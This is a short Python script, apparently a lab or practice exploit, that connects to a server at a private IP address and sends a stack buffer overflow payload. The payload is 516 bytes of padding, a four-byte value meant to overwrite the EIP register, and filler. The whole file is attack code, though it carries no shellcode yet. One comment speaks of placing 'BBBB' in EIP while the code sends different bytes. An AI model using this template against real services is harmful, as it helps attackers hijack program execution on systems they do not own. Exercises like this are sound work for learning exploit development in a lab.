import socket

#I finally got the server to work, so I can now test this


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#info of host
host = "192.168.195.237" #remember to change again before running
port = 8421

sock.connect((host, port))

#receive initial welcome message
response = sock.recv(2048)
print(response)

#try giving input of a specific length to have only BBBB in EIP
length = 516
padding = b"A"*length
eipOverwrite = b"\x76\xF2\x3C\xA6"
payload = b"C"*10
payload = padding + eipOverwrite + payload

print("Sending Payload")

sock.send(payload)

#Should not run unless exploit fails
response = sock.recv(2048)
print(response.decode())
